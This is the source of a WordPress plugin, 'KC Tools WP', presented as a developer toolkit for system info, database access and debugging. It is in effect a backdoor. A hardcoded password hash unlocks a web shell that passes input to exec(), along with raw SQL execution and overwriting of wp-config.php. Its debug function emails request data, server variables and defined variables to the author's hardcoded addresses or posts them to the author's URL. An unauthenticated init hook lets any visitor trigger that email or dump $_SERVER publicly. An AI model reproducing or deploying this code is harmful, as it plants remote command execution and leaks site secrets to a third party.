<?php 
/* 
	Plugin Name: KC Tools WP
	Plugin URI: http://krumch.com/kctools.html
	Description: Brain surgery for WEB-sites (System info, DB access, SSH, formatted debug output to mail, file and URL, debug shortcode and site wide debug email, all over HTTP)
	Author: Krum Cheshmedjiev
	Copyright: © 2020 Krum Cheshmedjiev
	Author URI: http://krumch.com
	Version: 2020.03.18
	Tested up to: 5.3.2
	Requires at least: 3.0
	Requires: WordPress® 3.0+, PHP 5.2+
	Tags: DB, DB access, developers tools, environment info, hardware info, KC Tools, kctools, PHP info, SSH, system info, tool
*/



function kctools() {
	$thepassword="1e9eab854542bf4ca0ac77335f03f53e";
	print '<style> .kcthand { cursor:pointer } </style><form name="kct" action="'.str_replace( '%7E', '~', $_SERVER['REQUEST_URI']).'" method=POST>';
	wp_nonce_field('form_submit', 'form_generate_nonce');
	print '<div id="kctools" style="width:80%;float:left;border-right:1px dotted black;overflow-x:auto;">';
	if(get_option('kctools') != md5($thepassword.$_SERVER['REMOTE_ADDR']) and (!isset($_POST['kctpassword']) or $thepassword != md5($_POST['kctpassword']))) {
		print '<br>Password: <input type="password" name="kctpassword" value=""><input type=submit>';
	} else {
		if(get_option('kctools') != md5($thepassword.$_SERVER['REMOTE_ADDR']) and isset($_POST['kctpassword']) and $thepassword == md5($_POST['kctpassword'])) update_option('kctools', md5($thepassword.$_SERVER['REMOTE_ADDR']));
		$tab=(!isset($_POST['tab']) or ($_POST['tab'] != 'db' and $_POST['tab'] != 'ssh' and $_POST['tab'] != 'more'))?'':$_POST['tab'];
		print '<input type="hidden" name="tab" value="'.$tab.'">';
		if(!isset($_POST['oldtab'])) $_POST['oldtab']='';
		if($tab != $_POST['oldtab']) $_POST['query']='';
		print '<input type="hidden" name="oldtab" value="'.$tab.'"><br><div style="width:100%"><ul>';
		print '<li style="float:left;position:relative;margin-top:12px;"><img src="'.plugins_url('kctools.gif', __FILE__).'"></li>';
		print '<li class=kcthand style="float:left;position:relative;margin:10px;background-color:';
		print ($tab == '' or $tab == 'env')?'#ccc':'#eee';
		print '" onclick="document.kct.tab.value=\'env\';document.kct.submit();">&nbsp;ENV&nbsp;</li>';
		print '<li class=kcthand style="float:left;position:relative;margin:10px;background-color:';
		print ($tab == 'db')?'#ccc':'#eee';
		print '" onclick="document.kct.tab.value=\'db\';document.kct.submit();">&nbsp;DB&nbsp;</li>';
		print '<li class=kcthand style="float:left;position:relative;margin:10px;background-color:';
		print ($tab == 'ssh')?'#ccc':'#eee';
		print '" onclick="document.kct.tab.value=\'ssh\';document.kct.submit();">&nbsp;SSH&nbsp;</li>';
		print '<li class=kcthand style="float:left;position:relative;margin:10px;background-color:';
		print ($tab == 'more')?'#ccc':'#eee';
		print '" onclick="document.kct.tab.value=\'more\';document.kct.submit();">&nbsp;more&nbsp;</li></ul></div><br><br><br>';
		switch ($tab) {
			case 'db':
				global $wpdb;
				$wpdb->show_errors();
				$tables=$wpdb->get_results('show tables', ARRAY_N);
				print "<center>";
				$tbls="<div style=\"border: 1px solid #000;width:80%;display:table-cell;\">";
				foreach($tables as $tbl) {
					$tbls.="<div style=\"float:left;margin:2px;background-color:#eee;aling:center\"><span class=kcthand onclick=\"document.kct.query.value='select * from ".$tbl[0]."';document.kct.submit();\">".$tbl[0]."</span><br><span class=kcthand onclick=\"document.kct.query.value='show columns from ".$tbl[0]."';document.kct.submit();\">cols</span></div>";
				}
				$tbls.="<!--/ul--></div>\n";
				print "$tbls<br><br><div><input name=query size=60><input type=submit>";
				if(isset($_POST['query']) && $_POST['query'] !== "") {
					print "<input type=submit value=\"Repeat Query\" onclick=\"document.kct.query.value='".$_POST['query']."';\"><input type=button value=\"Copy Query\" onclick=\"document.kct.query.value='".$_POST['query']."';\">";
					$_POST['query']=str_replace(array("\\'", '\\"'), array("'", '"'), $_POST['query']);
					$temp=str_replace(array('<', '>'), array('&lt;', '&gt;'), $_POST['query']);
					print "</div><br>\n<br>$temp<br><br><table style=\"border:1px solid #ccc\">\n";
					$q=$wpdb->get_results($_POST['query'], ARRAY_A);
					if(!$q) {
						print "<tr><td style=\"border:1px solid #ccc\">Done</td></tr>\n";
					} else {
						print "<tr>";
						foreach ($q[0] as $key => $val) {
							print "<th style=\"border:1px solid #ccc\">$key</th>";
						}
						print "</tr>\n";
						$trid = 0;
  					foreach ($q as $row) {
							print "<tr>";
							$tdid = 0;
							foreach($row as $j) {
								$jj = false;
								if(($j[0] == '{' and substr($j, -1) == '}')) { # JSON
									$jj = json_decode($j);
								} else {
									$jj = explode(':', $j);
									if(($jj[0] == 'a' and $jj[1] == intval($jj[1]) and $jj[2][0] == '{') # array
									or (($jj[0] == 'O' or $jj[0] == 's') and $jj[1] == intval($jj[1]) and $jj[2][0] == '"')) { # object or structure
										$jj = unserialize($j);
									} else {
										$jj = false;
									}
								}
								$j=str_replace('<', '&lt;', $j);
								$j=str_replace('>', '&gt;', $j);
								if($jj) $j .= '<br><a href="#" onclick="jQuery(\'#c'."$trid-$tdid".'\').toggle();return false;">-----------DECODED------------</a><br><div id="c'."$trid-$tdid".'" style="display:none;"><pre>'.print_r($jj, true).'</pre><br><a href="#" onclick="jQuery(\'#c'."$trid-$tdid".'\').toggle();return false;">-----------DECODED------------</a></div>';
								print "<td style=\"border:1px solid #ccc\">$j</td>";
								$tdid++;
							}
							print "</tr>\n";
							$trid++;
						}
					}
					print "</table><br><br>\n$tbls</center>";
				} else {
					print "</div>";
				}
				break;
			case 'ssh':
				if(!isset($_POST['query'])) $_POST['query']="";
				print "<input name=query size=60><br>".$_POST['query']."<br><br></center>\n";
				$temp=preg_replace('/([$&@])/', '\\$1', $_POST['query']);
				$temp=exec("$temp 2>&1", $rez);
				$out="";
				foreach($rez as $row) {
					$out.=str_replace('<', '&lt;', $row)."\n";
				}
				print "<pre>$out</pre>";
				print "<script lang=JavaScript>\ndocument.kct.query.focus();\n</script>";
				break;
			case 'more':
?>
<h2>Hidden functions</h2>
<h3>Better debug output</h3>
The plugin contains a function "KCT_Err", that works as debug output. There is not alwais possible just to print a variable and exit. Use this function to print whatever you need, and in several different ways. Plus it prints _REQUEST, _SERVER, KDB (explained later), call stack and get_defined_vars().<br><br>
<strong>$KDB</strong>: A global string variable for debug. Use it in your code like this:<br><br>
$GLOBALS['KDB'] .= "function_name::variable -> &lt;pre>".print_r($variable, true)."&lt;/pre>!&lt;br>\n";<br><br>This way you can collect any info you need during your test. Do not mistake it with $err, explained bellow: $KDB can be anywhere in your code, your own log.<br><br>
<strong>KCT_Err($err='', $output="wp_mail");</strong><br>
<strong>$err</strong>: String or array. Put whatever you want here. If in this array exists elements "subject", "function" or "error", it's value will be set as subject of the email (see bellow). If you set both, "error" have priority, then "function".<br>
<strong>$output</strong>: String, one of "mail", "wp_mail", "log", "url" and "shortcode" - output options. Sets where to print the output. The "mail" and "wp_mail" submits emails, by corresponding "PHP mail()" or "WP wp_mail()" commands (set $debug_mail to your address). The "log" saves output to a log file "KCT_Err.txt" in plugin's directory. The "url" submits it to a URL (which you prepare to parse and save output for you - remote log; set the curl() options to your needs). The "shortcode" returns pre-formatted output as a single string.<br><br>
<h3>Debug shortcode</h3>
When you debug a page, or proccess behind a page, you can put the shortcode <strong>[kct $err]</strong> (where "$err" is the "$err array" of the function above), and debug output will be shown on the page.<br><br>
<h3>Site's wide debug email</h3>
Designed to use of my clients. Works as URL of the exactly site: <pre>http://www.com/?debug_email=DESCRIPTION</pre>, where "DESCRIPTION" is any string. You will get it by email (set $debug_mail to your address).<br><br>
<h3>Site's console info</h3>
Works as URL too: <pre>http://www.com/?my_ip</pre>. You will get a list with $_SERVER array (PHP) values.
<?php
				break;
			default:
				$file_content = $path_mod = '';
				while(!file_exists(dirname(__FILE__)."{$path_mod}/wp-config.php")) {
					$path_mod .= '/..';
				}
				$filename = dirname(__FILE__).$path_mod.'/wp-config.php';
				if(isset($_POST['wp_config'])) {
					$filename_backup = dirname(__FILE__).$path_mod.'/wp-config-backup.php';
					if (isset($_POST['saveconfig']) && !isset($_POST['form_generate_nonce']) && !check_admin_referer($_POST["form_generate_nonce"], "form_submit")) {
						print "Sorry, your nonce did not verify. ";
					} else {
						copy($filename, $filename_backup);
						file_put_contents($filename, stripcslashes($_POST['wp_config']));
					}
				}
				if(file_exists($filename) && is_file($filename) && is_readable($filename)) {
					$file = file_get_contents($filename, FILE_USE_INCLUDE_PATH);
					$file_content = file_get_contents($filename, filesize($filename));
					@file_get_contents($file);
        }
				if($file_content != '') {
					echo '<h2>Config file:</h2><br><textarea name="wp_config" id="" cols="100" rows="20">'.$file_content.'</textarea><br><br>';
					echo "<input name = 'saveconfig' class = 'button button-primary' type = 'submit' value = 'Save Changes' >";
				}
				ob_start();
				phpinfo();
				$body = array();
				$b = explode('style', ob_get_clean(), 3);
				list($temp,) = explode('>', $b[1], 2);
				$body[1] = "<style$temp>";
				list(,$temp) = explode('>', $b[1], 2);
				$body[2] = substr(str_replace(array('<!--', '-->'), '', $temp), 0, -2);
				$body[3] = "</style>";
				list(,$temp,) = explode('body>', $b[2], 3);
				$body[4] = substr($temp, 0, -2);
				$styles = explode('}', trim(str_replace("\n", '', $body[2])));
				$rez = array();
				foreach($styles as $st) {
					$row = explode('{', $st);
					$tags = (isset($row[0]))?$row[0]:'';
					$set = (isset($row[1]))?$row[1]:'';
					$tags = trim($tags);
					if(strpos($tags, ',')) {
						$rt = '';
						foreach(explode(',', $tags) as $t) {
							$t = kctsetit(trim($t));
							if($t) {
								if($rt) $rt .= ', ';
								$rt .= $t;
							}
						}
						$tags = $rt;
					} else {
						$tags = kctsetit($tags);
					}
					if($tags) $rez[] = $tags.' {'.$set;
				}
				$body[2] = implode("}\n", $rez)."}\n";
				echo $body[1].$body[2].$body[3].$body[4];
				break;
		}
		print "</div><div style=\"float:left;width:19.9%;height:100%\"><iframe id=\"kcnews\" width=\"100%\" height=\"500\" src=\"//krumch.com/kc_news.php?src=kct_wp\"></iframe></div>";
	}
	print "</form><script type='text/javascript'>
/* <![CDATA[ */
	jQuery('#kcnews').css('height', jQuery('#kcnews').parent().parent().parent().css('height'));
/* ]]> */
</script>";
	return;
}

function kct_scripts_method() { wp_enqueue_script("jquery"); }
add_action('admin_enqueue_scripts', 'kct_scripts_method');

function kctsetit($tag) {
	if(strpos($tag, 'body') === 0) return '';
	if($tag == '') return '';
	return "#kctools $tag";
}

function kctools_activate() {}
register_activation_hook( __FILE__, 'kctools_activate' );

function kctools_deactivate() { delete_option('kctools'); }
register_deactivation_hook( __FILE__, 'kctools_deactivate' );

function kctools_admin_actions() { add_options_page("kctools", "<img src=\"".plugins_url('kctools-gray.gif', __FILE__)."\"> KC Tools", 'administrator', "kctools", "kctools"); }  
add_action('admin_menu', 'kctools_admin_actions');

global $KDB;
if(!function_exists('KCT_Err')) {
	function KCT_Err($err='', $output="wp_mail") {
		global $KDB;
		$debug_mail = 'krumch@gmail.com';
		$debug_mail2 = 'krumch@iname.com';
		$debug_url = 'http://krumch.com/cgi-bin/tdl.pl';
		$dv = get_defined_vars();
		$e = new Exception;
		$message="_________Create time__________<br>\n!".date(DATE_RSS)."!<br>\n";
		$message.="_________ _REQUEST __________<br>\n!<pre>".print_r($_REQUEST, true)."</pre>!\n";
		$message.="\n_________ _SERVER __________<br>\n!<pre>".print_r($_SERVER, true)."</pre>!\n";
		if($KDB) $message.="\n_________ KDB __________<br>\n$KDB";
		if($err) $message.="\n_________ERROR__________<br>\n!<pre>".print_r($err, true)."</pre>!\n";
		$message.="_________CALL STACK __________<br>\n!<pre>".print_r($e->getTraceAsString(), true)."</pre>\n";
		unset($e);
		$message.="_________ get_defined_vars() __________<br>\n!<pre>".print_r($dv, true)."</pre>\n";
		$subject = '';
		if(isset($err['subject'])) $subject = $err['subject'];
		if($subject == '' and isset($err['function'])) $subject = $err['function'];
		if($subject == '' and isset($err['error'])) $subject = $err['error'];
		if($subject == '') $subject = 'KCT_Err '.__FILE__;
		if($output == "mail") {	
			mail($debug_mail, $subject, $message, "From: ".((function_exists('get_option'))?get_option('admin_email'):$debug_mail2));
		} elseif($output == "wp_mail") {	
			wp_mail($debug_mail, $subject, $message, "From: ".get_option('admin_email'));
		} elseif($output == "log") {
			$fp = fopen(plugin_dir_path( __FILE__ ).'KCT_Err.txt', 'a');
			fputcsv($fp, array(date('m/d/Y h:i:s a', time()), "Subject !$subject!", "Message !$message!"));
			fclose($fp);
		} elseif($output == "url") {
			$ch = curl_init($debug_url);
			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
			curl_setopt($ch, CURLOPT_POSTFIELDS, "db=7&id=7&pwd=tdl:log&newtask=Subject !".urlencode($subject)."!<br>Message !".urlencode($message)."!");
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
#		curl_setopt($ch, CURLOPT_VERBOSE, true);
			$result = curl_exec($ch);
		} elseif($output == "shortcode") {
			return $message;
		}
#	exit();
	}

	function KCT_Errshort($dbg) {
		return KCT_Err($dbg, "shortcode");
	}
	add_shortcode('kct', 'KCT_Errshort');
}

function kc_debug_email() {
	if(isset($_REQUEST['debug_email'])) {
		KCT_Err(array('subject' => $_REQUEST['debug_email'], 'debug_email' => $_REQUEST['debug_email']));
		echo 'Email sent';
		exit();
	} else if(isset($_REQUEST['my_ip'])) {
		echo "_SERVER -> !<pre>".print_r($_SERVER, true)."</pre>!<br>\n";
		exit();
	}
}
add_action('init', 'kc_debug_email');
# http://www.com/?debug_email=DESCRIPTION

?>
